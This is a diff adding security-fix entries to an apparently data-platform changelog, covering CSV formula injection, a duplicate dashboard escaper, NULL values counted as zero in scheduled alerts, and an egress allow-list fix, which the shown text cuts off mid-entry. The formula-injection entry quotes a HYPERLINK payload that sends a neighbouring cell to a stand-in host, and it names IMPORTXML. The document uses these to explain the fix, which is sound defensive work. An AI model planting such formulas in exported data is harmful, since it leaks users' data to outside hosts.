@@ -163,6 +163,31 @@ cut numbered releases; see [ROADMAP.md](./ROADMAP.md).
 
 ### Security & governance
 
+- **Fixed: exported CSVs could carry spreadsheet formulas (CWE-1236).** Excel,
+  LibreOffice and Sheets execute a cell starting with `=`, `+`, `-`, `@`, tab or
+  carriage return, and RFC-4180 quoting does not stop it — the quotes are
+  consumed by the CSV parser and the cell is still a formula. It matters here
+  because **the person exporting is not the author of the rows**: they arrive
+  from SaaS connector syncs, from datasets another tenant shared, and from
+  warehouse queries. `=HYPERLINK("https://x/?d="&A1,"Open")` exfiltrates the
+  neighbouring cell when an analyst opens the file and clicks; Sheets runs
+  `=IMPORTXML(...)` with no click. Such values are now prefixed with an
+  apostrophe, which spreadsheets strip on display. **Numbers are exempt**, so
+  `-5` is still `-5` rather than text.
+- **Fixed: the dashboard page had a second, worse CSV escaper.** Its inline copy
+  did not escape the **header row** at all, tested `/[",
+]/` and so missed a
+  bare carriage return, and had no formula guard. It now calls the shared
+  writer, with a test that fails if a local escaper reappears.
+- **Fixed: scheduled alerts counted NULL as zero.** `alertValue` coerced every
+  cell with `Number()` and kept whatever was finite — but `Number(null)` is `0`
+  and `0` is finite. On a response-time column with one blank row that made
+  **avg 97.5 instead of 130 and min 0 instead of 120**, so "alert when
+  `min(ms) < 5`" fired on a healthy service; on an all-negative column it made
+  `max` 0 instead of the true maximum. `""`, `"   "` and `[]` coerce the same
+  way. SQL aggregates ignore NULL and these now do too. This is the unattended
+  path — the wrong number arrives as an email with nobody watching.
+
 - **Fixed: the notebook egress allow-list silently accepted entries it could
   never enforce.** The kernel's outbound policy is a squid `dstdomain` ACL, and
   the hostname test allowed digits in every label, so **IP addresses passed**:
